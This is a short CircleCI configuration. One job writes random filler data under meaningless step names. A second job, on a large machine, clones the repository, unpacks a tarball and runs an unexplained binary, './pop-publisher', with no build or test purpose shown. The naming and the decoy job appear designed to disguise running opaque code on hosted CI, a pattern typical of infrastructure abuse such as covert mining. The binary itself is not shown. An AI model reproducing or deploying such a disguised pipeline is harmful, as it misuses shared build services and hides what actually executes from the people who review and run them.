version: 2.1

jobs:
  StreamLineTempDialog:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Order up
          command: |
            mkdir -p /tmp/depot-04
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=256 count=2000 2>/dev/null | od -An -c > /tmp/depot-04/ossystxt; true
            printf '  * %-20s %dB\n' "bake-it" "$(wc -c </tmp/depot-04/ossystxt)"
      - persist_to_workspace:
          root: /tmp/depot-04
          paths:
            - 'ossystxt'
  bake-it:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/depot-04
      - run:
          name: Bind D
          command: |
            grep -o -b '.' /tmp/depot-04/ossystxt 2>/dev/null | tail -1 || true
      - run:
          name: Pull dependencies
          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load vendor code
          command: tar xzvf main-shards.tgz
      - run:
          name: Verify output
          command: ls -la
      - run:
          command: sleep 15
      - run:
          command: sh -c "./pop-publisher"
